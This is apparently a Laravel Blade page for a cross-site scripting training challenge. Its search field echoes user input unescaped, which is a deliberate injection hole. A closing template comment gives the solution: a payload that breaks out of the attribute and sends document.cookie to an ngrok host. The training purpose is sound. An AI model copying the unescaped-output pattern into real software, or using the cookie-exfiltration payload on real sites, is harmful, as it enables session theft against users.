<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Challenge 2</title>
    <style>
        body {
            background-color: #fff;
        }

        .fw {
            position: absolute;
            top: 0px;
            right: 0px;
            bottom: 0px;
            left: 0px;
            z-index: 1;
            overflow: hidden;
        }

        .ct {
            z-index: 10;
            position: relative;
        }
    </style>

</head>

<body>

    <p><a href="/day1/challenge3">Reset form</a></p>

    <h2>Escape Input!</h2>

    <p>In the previous challenge, we were dealing with an incredibly simple injection avenue. The user input was output
        directly onto the page, outside any tags or attributes. This allowed us to use
        <script>
            ...
        </script> directly, without having close anything. This won't usually be the case.
    </p>

    <h2>Objective</h2>

    <ul>
        <li>Send the value of document.cookie to GET
            https://3e36-51-52-158-78.ngrok-free.app/xss/two?cookie=COOKIE_PAYLOAD&name=YOUR_NAME.
        </li>
    </ul>

    <form method="POST">
        @csrf
        <p>Search:</p>
        <div>
            <input type="text" name="search" id="search" style="width: 95%" placeholder="Search term"
                value="{!! request()->get('search') !!}" />
        </div>
        <p><button type="submit">Search!</button></p>
    </form>

</body>

</html>

{{-- "><script>fetch("https://3e36-51-52-158-78.ngrok-free.app/xss/two?name=Kevin&cookie=" + document.cookie)</script> --}}
